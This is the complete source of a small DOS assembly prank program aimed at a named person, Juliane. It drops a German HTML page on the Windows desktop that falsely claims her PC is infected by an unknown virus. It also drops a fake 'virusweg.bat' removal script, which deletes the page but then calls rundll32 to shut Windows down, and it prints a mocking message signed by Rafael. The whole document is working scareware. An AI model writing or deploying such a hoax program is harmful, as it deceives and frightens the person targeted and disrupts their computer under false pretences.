.model tiny
.code

mov ax,13
int 010

mov ax,03c00
xor cx,cx
mov dx,offset Dat
int 021
mov bx,ax
mov ax,04000
mov cx,299
mov dx,offset datxt
int 021
mov ax,03e00
int 021

mov ax,03c00
xor cx,cx
mov dx,offset anti
int 021
mov bx,ax
mov ax,04000
mov cx,66
mov dx,offset antitxt
int 021
mov ax,03e00
int 021

mov ax,03c00
xor cx,cx
mov dx,offset jul
int 021
mov bx,ax
mov ax,03e00
int 021

mov ax,0900
mov dx,offset text
int 021

mov ax,0700
int 021

mov ax,3
int 010

mov ax,04c00
int 21h

.data
Dat	db "c:\windows\desktop\info.htm",0
datxt	db "<HTML><HEAD><TITLE>Virenseuche</TITLE></HEAD><BODY BGCOLOR=#403020><FONT SIZE=7><MARQUEE>Hallo Juliane, Dein PC ist verseucht!</MARQUEE></FONT>Ich bin fies! Auf deinem Computer befindet sich ein Virus, der jedem AntiVirus-Programm bisher unbekannt ist!<BR><BR>Viel Spass!<BR><BR>®afael</BODY></HTML>"
anti	db "c:\windows\desktop\virusweg.bat",0
antitxt	db "del info.htm",0d,0a,"rundll32.exe USER,EXITWINDOWS",0d,0a,"cls",0d,0a,"Viel Spass noch!"
text	db "Hallo Juliane!",0d,0a,"Lies dir Info.htm durch,",0d,0a,"dann erst starte das Programm!",0d,0a,"(Beide auf dem Desktop)",0d,0a,0d,0a,"HAR HAR HAR!!!",0d,0a,0d,0a,"Rafael$"
jul	db "juliane.com",0

end